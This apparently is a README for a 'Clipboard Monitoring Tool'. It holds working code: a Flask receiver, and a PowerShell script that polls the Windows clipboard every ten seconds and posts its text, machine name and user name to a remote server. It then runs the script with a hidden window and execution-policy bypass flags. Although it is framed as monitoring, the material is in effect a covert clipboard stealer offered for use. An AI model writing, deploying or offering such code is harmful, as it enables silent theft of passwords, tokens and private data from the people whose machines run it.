# Clipboard Monitoring Tool

This project enables clipboard monitoring on a Windows machine, logging clipboard contents locally and sending them to a remote server using HTTP POST requests. It is ideal for scenarios where clipboard data needs to be monitored across a network.

## Features

- **Real-Time Clipboard Monitoring**: Continuously monitors clipboard text on a Windows machine.
- **Logging**: Logs clipboard content locally for easy reference.
- **Remote Data Transmission**: Sends clipboard content, along with machine and user information, to a remote server running Flask.
- **Error Handling**: Includes basic error handling for network connectivity issues.

## Requirements

- **Python** (for running the Flask server)
- **Flask** library (`pip install Flask`)
- **PowerShell** (installed by default on Windows)

## Getting Started

### 1. Set Up the Flask Server

On a machine that will receive clipboard data:

1. **Save the Flask server code** to a file, e.g., `server.py`:
   ```python
   from flask import Flask, request

   app = Flask(__name__)

   @app.route('/clipboard_receiver', methods=['POST'])
   def receive_clipboard():
       clipboard_data = request.form.get('clipboard_data')
       machine_name = request.form.get('machine_name')
       user_name = request.form.get('user_name')

       with open('clipboard_logs.txt', 'a') as f:
           f.write(f"[{machine_name}] [{user_name}] Clipboard: {clipboard_data}\n")

       return "Data received", 200

   if __name__ == '__main__':
       app.run(host='0.0.0.0', port=5000)
   ```
2. **Run the Flask server** with:
   ```bash
   python server.py
   ```
   This will start the server on port 5000, listening for incoming data.

### 2. Configure the PowerShell Clipboard Monitor

On the Windows machine that will send clipboard data:

1. **Save the PowerShell script** to a file, e.g., `clipboard_monitor.ps1`:
   ```powershell
   Add-Type -AssemblyName System.Windows.Forms
   $webhook_url = "http://<Your Flask Server IP>:5000/clipboard_receiver"

   while ($true) {
       $clipText = [System.Windows.Forms.Clipboard]::GetText()

       if ($clipText) {
           Add-Content -Path "C:\Users\Public\clipboard_log.txt" -Value "Clipboard: $clipText"
           
           $postParams = @{
               clipboard_data = $clipText
               machine_name = $env:COMPUTERNAME
               user_name = $env:USERNAME
           }

           try {
               Invoke-RestMethod -Uri $webhook_url -Method Post -Body $postParams
           } catch {
               Write-Host "Failed to send data: $_"
           }
       }

       Start-Sleep -Seconds 10
   }
   ```
2. **Update the `webhook_url`** to the IP address of the machine running the Flask server. For example:
   ```powershell
   $webhook_url = "http://192.168.1.10:5000/clipboard_receiver"
   ```
3. **Run the script** in PowerShell with:
   ```powershell
   powershell -NoP -NonI -W h -Exec Bypass .\clipboard_monitor.ps1
   ```

### 3. Testing the Setup

- Copy some text to the clipboard on the Windows machine running the PowerShell script.
- The clipboard text should appear in `C:\Users\Public\clipboard_log.txt` on the local machine.
- Check `clipboard_logs.txt` on the Flask server machine to confirm that the data has been successfully sent and logged.

## Security and Usage Warnings

- **Sensitive Data**: Be cautious when monitoring clipboard data, as it may contain sensitive information.
- **Network Security**: Only use this setup in trusted environments, and ensure proper network security practices.
  
## 🚀 About Me
I'm More Expensive Noob... [ ShadowGlint ]
